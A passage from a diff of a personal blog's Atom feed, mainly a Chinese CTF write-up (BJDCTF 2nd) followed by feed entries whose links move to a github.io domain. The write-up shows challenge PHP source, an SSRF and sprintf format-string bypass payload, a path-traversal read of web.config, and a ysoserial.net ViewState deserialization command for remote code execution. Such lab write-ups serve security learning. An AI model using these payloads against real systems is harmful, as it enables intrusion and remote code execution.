class="keyword">for</span>=<span class="string">"q1"</span>&gt;你希望以何种方式访问？GET？POST?&lt;/label&gt;&lt;/span&gt;</span><br><span class="line">                    &lt;input id=<span class="string">"q3"</span> name=<span class="string">"q3"</span> type=<span class="string">"text"</span>/&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">            &lt;/ol&gt;</span><br><span class="line">            &lt;button class="submit" type="submit" value="submit"&gt;提交&lt;/button&gt;</span><br><span class="line">            &lt;div class="controls"&gt;</span><br><span class="line">                &lt;button class="next"&gt;&lt;/button&gt;</span><br><span class="line">                &lt;div class="progress"&gt;&lt;/div&gt;</span><br><span class="line">                &lt;span class="number"&gt;</span><br><span class="line">&lt;span class="number-current"&gt;&lt;/span&gt;</span><br><span class="line">&lt;span class="number-total"&gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">                &lt;span class="error-message"&gt;&lt;/span&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;span class="final-message"&gt;&lt;/span&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href=<span class="string">"https://gem-love.com"</span> target=<span class="string">"_blank"</span>&gt;@颖奇L<span class="string">'Amore&lt;/a&gt;&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string">&lt;/section&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script type="text/javascript" src="js/classie.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script type="text/javascript" src="js/stepsForm.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">    var theForm = document.getElementById( '</span>theForm<span class="string">' );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    new stepsForm( theForm, &#123;</span></span><br><span class="line"><span class="string">        onSubmit : function( form ) &#123;</span></span><br><span class="line"><span class="string">            classie.addClass( theForm.querySelector( '</span>.simform-inner<span class="string">' ), '</span>hide<span class="string">' );</span></span><br><span class="line"><span class="string">            var messageEl = theForm.querySelector( '</span>.<span class="keyword">final</span>-message<span class="string">' );</span></span><br><span class="line"><span class="string">            form.submit();</span></span><br><span class="line"><span class="string">            messageEl.innerHTML = '</span>Ok...Let me have a check<span class="string">';</span></span><br><span class="line"><span class="string">            classie.addClass( messageEl, '</span>show<span class="string">' );</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125; );</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$filter1 = '</span>/^http:\/\/<span class="number">127</span>\<span class="number">.0</span>\<span class="number">.0</span>\<span class="number">.1</span>\<span class="comment">//i';</span></span><br><span class="line">$filter2 = <span class="string">'/.?f.?l.?a.?g.?/i'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;  <span class="comment">//q1没什么用，但必须有值。</span></span><br><span class="line">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;<span class="comment">// q2终将影响 filter1、2的判定。被强行加上的帽子可以用’#‘或者’?params=‘等摘下。</span></span><br><span class="line">    $method = $_POST[<span class="string">'q3'</span>];<span class="comment">// q3与最后的的sprintf有一定联系，需要加以利用。</span></span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2); <span class="comment">//一定要是http://127.0.0.1/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);<span class="comment">// 换句话就是不能有flag等字样 ffllaagg等也不行。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4); <span class="comment">// 除了GET、POST打头都不要</span></span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="keyword">false</span>); <span class="comment">// 第二个参数是use_include_path，这里false表示取消在include_path中寻找文件。</span></span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">    <span class="comment">/* 从函数文档中我们能了解到 </span></span><br><span class="line"><span class="comment">    ”the argument is treated as an integer and presented as a (signed) decimal number.“</span></span><br><span class="line"><span class="comment">    参数会被当做一个整数呈现为十六进制数</span></span><br><span class="line"><span class="comment">    但是前面还有个method我们可以利用，我们可以让q3=GET%s%</span></span><br><span class="line"><span class="comment">    构造出这样的字符串GET%s%%d，两个百分号让百分号的转义失去效果，而使其只有%s，有效地输出字符串。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而home长这样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"y1ng"</span>, sha1(md5(<span class="string">'y1ng'</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">'your_ip_address'</span>, md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\^|\~|&amp;|\|/"</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"forbidden"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/.?f.?l.?a.?g.?/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/.?a.?d.?m.?i.?n.?/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"You! are! not! my! admin!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^home$/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"禁止套娃"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/home$/i"</span>, $_GET[<span class="string">'file'</span>]) <span class="keyword">or</span> preg_match(<span class="string">"/system$/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">'file'</span>].<span class="string">".php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">'file'</span>].<span class="string">".fxxkyou!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"现在访问的是 "</span>.$file . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='./home.php?file=system'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审查代码后，可以了解我们不能直接得到flag.php等带有flag字样的文件，不能在home中得到admin文件，那么试着在system中获取admin文件。详情看代码中的注释。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1=a&amp;q2=http://127.0.0.1/admin.php?b=&amp;q3=GET%s%</span><br></pre></td></tr></table></figure><p>在<code>system</code>中，通过这样的payload，我们获得了admin的源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 加密函数</span></span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="string">'your_ip_address'</span>] === md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="string">'y1ng'</span>] === sha1(md5(<span class="string">'y1ng'</span>)))</span><br><span class="line">        <span class="comment">// 这两个cookie不能丢</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="comment"># 原来如此，这句话无论如何会存在。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">'decrypt'</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        <span class="comment"># 两个cookie确认存在后进行下一步</span></span><br><span class="line">        $data = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">            <span class="comment">// 这是我们的目标</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'爬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    <span class="comment">//好家伙，上面这句话是陷阱</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span><br><span class="line">    <span class="comment"># random_bytes 是php7之后的事情</span></span><br><span class="line">    <span class="comment"># 这样的构造基本可以当作真随机</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看了一遍代码后第一个想到是mt的伪随机，但是这里的结构已经可以接近真随机了。</p><p>不过好在secret是存放在session中的，而session依赖于cookie中的sessionid，依靠这个关系我们把sessionid置空可以使该session对应键的值为NULL，这样data就是可控的了。</p><p>在本地使用aseEn函数（记得修改iv变量）构造出<code>decrypt=OGiyKXIyhghrDCtpomyQ6A==</code>，置空对应cookies，完事。</p><p><img src="https://z3.ax1x.com/2021/04/21/cbMwIU.png" alt="image-20210421132550213"></p><p>参考：</p><p><a href="https://www.cnblogs.com/qingwuyou/p/10687463.html" target="_blank" rel="noopener">解析php sprintf函数漏洞</a></p><p>拓展：</p><p><a href="https://www.jianshu.com/p/9c031dee57b7" target="_blank" rel="noopener">PHP trick</a></p><h3 id="EasyAspDotNet"><a href="#EasyAspDotNet" class="headerlink" title="EasyAspDotNet"></a>EasyAspDotNet</h3><p>ASP渣在此观望。</p><p>点击<code>click</code>，进入一个新页面，有了图片，改了图片的uri发现有四张图。</p><p>查看源码，发现<code>input</code>中的<code>value</code>类似<code>base</code>，而且是变化的。</p><p>用来包含图片的脚本可以包含其他不止图片的文件<code>ImgLoad.aspx?path=1.png</code></p><p>例如包含<code>web.config</code>? <code>ImgLoad.aspx?path=../../web.config</code>，直接用view-source下载下来。</p><p>这里已知一个RCE洞，可以使用<code>ysoserial</code>来反序列化。微软官方是这么描述的。</p><blockquote><h4 id="Microsoft-Exchange-验证密钥远程执行代码漏洞"><a href="#Microsoft-Exchange-验证密钥远程执行代码漏洞" class="headerlink" title="Microsoft Exchange 验证密钥远程执行代码漏洞"></a>Microsoft Exchange 验证密钥远程执行代码漏洞</h4><p>当服务器在安装时无法正确创建唯一密钥时，Microsoft Exchange Server 中将存在一个远程执行代码漏洞。</p><p>知道验证密钥后，具有邮箱的认证用户可以传递要由 Web 应用程序反序列化的任意对象，该 Web 应用程序以“系统”身份运行。</p></blockquote><p>现在利用刚刚的<code>web.config</code>构造payload反序列化后进行远程代码执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c <span class="string">"ExploitClass.cs;./System.dll;./System.Web.dll"</span> --generator=<span class="string">"CA0B0334"</span> --validationalg=<span class="string">"SHA1"</span> --validationkey=<span class="string">"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"</span></span><br></pre></td></tr></table></figure><p>将payload用post方法传入<code>__VIEWSTATE</code>中，再使用<code>cmd</code>参数用来执行指令即可。</p><p>工具：</p><p><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">ysoserial</a></p><p>参考：</p><p><a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;BJDCTF-2nd&quot;&gt;&lt;a href=&quot;#BJDCTF-2nd&quot; class=&quot;headerlink&quot; title=&quot;BJDCTF 2nd&quot;&gt;&lt;/a&gt;BJDCTF 2nd&lt;/h1&gt;&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;header
+      
+    
+    </summary>
+    
+    
+    
+      <category term="BUU" scheme="https://ensuperb.github.io/tags/BUU/"/>
+    
+  </entry>
+  
+  <entry>
     <title>歌曲推荐 トルキア - 菅野洋子</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/musicrecommendation2/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/musicrecommendation2/</id>
+    <link href="https://ensuperb.github.io/posts/musicrecommendation2/"/>
+    <id>https://ensuperb.github.io/posts/musicrecommendation2/</id>
     <published>2021-02-08T03:31:35.000Z</published>
     <updated>2021-02-26T05:04:09.049Z</updated>
     
@@ -37,14 +61,14 @@
     
     
     
-      <category term="杂谈" scheme="https://ensuperb.gdpccsa.cn/tags/%E6%9D%82%E8%B0%88/"/>
+      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
     
   </entry>
   
   <entry>
     <title>2020-日常手记</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/2020-daliylearning/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/2020-daliylearning/</id>
+    <link href="https://ensuperb.github.io/posts/2020-daliylearning/"/>
+    <id>https://ensuperb.github.io/posts/2020-daliylearning/</id>
     <published>2020-12-30T06:00:00.000Z</published>
     <updated>2020-10-17T05:07:20.314Z</updated>
     
@@ -61,17 +85,17 @@
     </summary>
     
     
-      <category term="汇总" scheme="https://ensuperb.gdpccsa.cn/categories/%E6%B1%87%E6%80%BB/"/>
+      <category term="汇总" scheme="https://ensuperb.github.io/categories/%E6%B1%87%E6%80%BB/"/>
     
     
-      <category term="手记" scheme="https://ensuperb.gdpccsa.cn/tags/%E6%89%8B%E8%AE%B0/"/>
+      <category term="手记" scheme="https://ensuperb.github.io/tags/%E6%89%8B%E8%AE%B0/"/>
     
   </entry>
   
   <entry>
     <title>XCTF-Misc 进阶 0x03</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/XCTF-Misc-M-0x03/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/XCTF-Misc-M-0x03/</id>
+    <link href="https://ensuperb.github.io/posts/XCTF-Misc-M-0x03/"/>
+    <id>https://ensuperb.github.io/posts/XCTF-Misc-M-0x03/</id>
     <published>2020-12-13T07:18:55.000Z</published>
     <updated>2020-12-13T07:21:40.250Z</updated>
     
@@ -89,14 +113,14 @@
     
     
     
-      <category term="XCTF" scheme="https://ensuperb.gdpccsa.cn/tags/XCTF/"/>
+      <category term="XCTF" scheme="https://ensuperb.github.io/tags/XCTF/"/>
     
   </entry>
   
   <entry>
     <title>XCTF-Misc 进阶 0x01+1</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/XCTF-Misc-M-0x01/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/XCTF-Misc-M-0x01/</id>
+    <link href="https://ensuperb.github.io/posts/XCTF-Misc-M-0x01/"/>
+    <id>https://ensuperb.github.io/posts/XCTF-Misc-M-0x01/</id>
     <published>2020-12-08T12:32:33.000Z</published>
     <updated>2020-12-08T12:41:29.215Z</updated>
     
@@ -114,14 +138,14 @@
     
     
     
-      <category term="XCTF" scheme="https://ensuperb.gdpccsa.cn/tags/XCTF/"/>
+      <category term="XCTF" scheme="https://ensuperb.github.io/tags/XCTF/"/>
     
   </entry>
   
   <entry>
     <title>XCTF-Web 进阶 0x01</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/XCTF-WEB-M-0x01/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/XCTF-WEB-M-0x01/</id>
+    <link href="https://ensuperb.github.io/posts/XCTF-WEB-M-0x01/"/>
+    <id>https://ensuperb.github.io/posts/XCTF-WEB-M-0x01/</id>
     <published>2020-10-02T11:00:00.000Z</published>
     <updated>2020-10-17T03:11:13.698Z</updated>
     
@@ -139,14 +163,14 @@
     
     
     
-      <category term="XCTF" scheme="https://ensuperb.gdpccsa.cn/tags/XCTF/"/>
+      <category term="XCTF" scheme="https://ensuperb.github.io/tags/XCTF/"/>
     
   </entry>
   
   <entry>
     <title>曲类分享 - Chillstep</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/MusicShare-Chillstep/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/MusicShare-Chillstep/</id>
+    <link href="https://ensuperb.github.io/posts/MusicShare-Chillstep/"/>
+    <id>https://ensuperb.github.io/posts/MusicShare-Chillstep/</id>
     <published>2020-09-01T03:14:06.000Z</published>
     <updated>2020-09-01T03:58:37.129Z</updated>
     
@@ -163,14 +187,14 @@
     
     
     
-      <category term="杂谈" scheme="https://ensuperb.gdpccsa.cn/tags/%E6%9D%82%E8%B0%88/"/>
+      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
     
   </entry>
   
   <entry>
     <title>吾听此曲三月不知肉味故荐君(不定期更新)</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/musicrecommendation/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/musicrecommendation/</id>
+    <link href="https://ensuperb.github.io/posts/musicrecommendation/"/>
+    <id>https://ensuperb.github.io/posts/musicrecommendation/</id>
     <published>2020-06-27T12:38:59.000Z</published>
     <updated>2020-06-27T13:14:06.293Z</updated>
     
@@ -188,14 +212,14 @@
     
     
     
-      <category term="杂谈" scheme="https://ensuperb.gdpccsa.cn/tags/%E6%9D%82%E8%B0%88/"/>
+      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
     
   </entry>
   
   <entry>
     <title>Github注册指导并尝试关注ENSERUPB</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/signupgithubtutorial/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/signupgithubtutorial/</id>
+    <link href="https://ensuperb.github.io/posts/signupgithubtutorial/"/>
+    <id>https://ensuperb.github.io/posts/signupgithubtutorial/</id>
     <published>2020-06-14T13:50:25.000Z</published>
     <updated>2020-10-17T05:08:31.570Z</updated>
     
@@ -212,14 +236,14 @@
     
     
     
-      <category term="杂谈" scheme="https://ensuperb.gdpccsa.cn/tags/%E6%9D%82%E8%B0%88/"/>
+      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
     
   </entry>
   
   <entry>
     <title>2020-internet-security by 黑人抬棺队</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/2020-internet-security/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/2020-internet-security/</id>
+    <link href="https://ensuperb.github.io/posts/2020-internet-security/"/>
+    <id>https://ensuperb.github.io/posts/2020-internet-security/</id>
     <published>2020-04-27T13:57:05.000Z</published>
     <updated>2020-06-19T03:50:12.899Z</updated>
     
@@ -236,14 +260,14 @@
     
     
     
-      <category term="取证" scheme="https://ensuperb.gdpccsa.cn/tags/%E5%8F%96%E8%AF%81/"/>
+      <category term="取证" scheme="https://ensuperb.github.io/tags/%E5%8F%96%E8%AF%81/"/>
     
   </entry>
   
   <entry>
     <title>如来十三掌</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/13beats-From-XCTF/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/13beats-From-XCTF/</id>
+    <link href="https://ensuperb.github.io/posts/13beats-From-XCTF/"/>
+    <id>https://ensuperb.github.io/posts/13beats-From-XCTF/</id>
     <published>2020-04-24T15:13:14.000Z</published>
     <updated>2020-06-19T03:50:12.931Z</updated>
     
@@ -260,14 +284,14 @@
     
     
     
-      <category term="XCTF" scheme="https://ensuperb.gdpccsa.cn/tags/XCTF/"/>
+      <category term="XCTF" scheme="https://ensuperb.github.io/tags/XCTF/"/>
     
   </entry>
   
   <entry>
     <title>FlatScience</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/FlatScience-From-XCTF/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/FlatScience-From-XCTF/</id>
+    <link href="https://ensuperb.github.io/posts/FlatScience-From-XCTF/"/>
+    <id>https://ensuperb.github.io/posts/FlatScience-From-XCTF/</id>
     <published>2020-04-24T14:23:58.000Z</published>
     <updated>2020-06-19T03:50:12.910Z</updated>
     
@@ -284,14 +308,14 @@
     
     
     
-      <category term="XCTF" scheme="https://ensuperb.gdpccsa.cn/tags/XCTF/"/>
+      <category term="XCTF" scheme="https://ensuperb.github.io/tags/XCTF/"/>
     
   </entry>
   
   <entry>
     <title>翻译-使用Python下载文件的简单示例</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/Trans-PythonDownload/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/Trans-PythonDownload/</id>
+    <link href="https://ensuperb.github.io/posts/Trans-PythonDownload/"/>
+    <id>https://ensuperb.github.io/posts/Trans-PythonDownload/</id>
     <published>2020-03-29T13:10:20.000Z</published>
     <updated>2020-06-19T03:50:12.912Z</updated>
     
@@ -308,14 +332,14 @@
     
     
     
-      <category term="翻译" scheme="https://ensuperb.gdpccsa.cn/tags/%E7%BF%BB%E8%AF%91/"/>
+      <category term="翻译" scheme="https://ensuperb.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
     
   </entry>
   
   <entry>
     <title>[vsftpd]服务搭建中遇到的问题以及解决方案</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/ideatodealproblemof-vsftpd-whenbuild/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/ideatodealproblemof-vsftpd-whenbuild/</id>
+    <link href="https://ensuperb.github.io/posts/ideatodealproblemof-vsftpd-whenbuild/"/>
+    <id>https://ensuperb.github.io/posts/ideatodealproblemof-vsftpd-whenbuild/</id>
     <published>2019-10-20T11:00:57.000Z</published>
     <updated>2020-06-19T03:50:12.911Z</updated>
     
@@ -332,14 +356,14 @@
     
     
     
-      <category term="杂谈" scheme="https://ensuperb.gdpccsa.cn/tags/%E6%9D%82%E8%B0%88/"/>
+      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
     
   </entry>
   
   <entry>
     <title>搭建超好玩的ts3server重点事项</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/breakpointofbuildts3server/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/breakpointofbuildts3server/</id>
+    <link href="https://ensuperb.github.io/posts/breakpointofbuildts3server/"/>
+    <id>https://ensuperb.github.io/posts/breakpointofbuildts3server/</id>
     <published>2019-08-04T06:24:29.000Z</published>
     <updated>2020-07-11T13:15:46.034Z</updated>
     
@@ -356,14 +380,14 @@
     
     
     
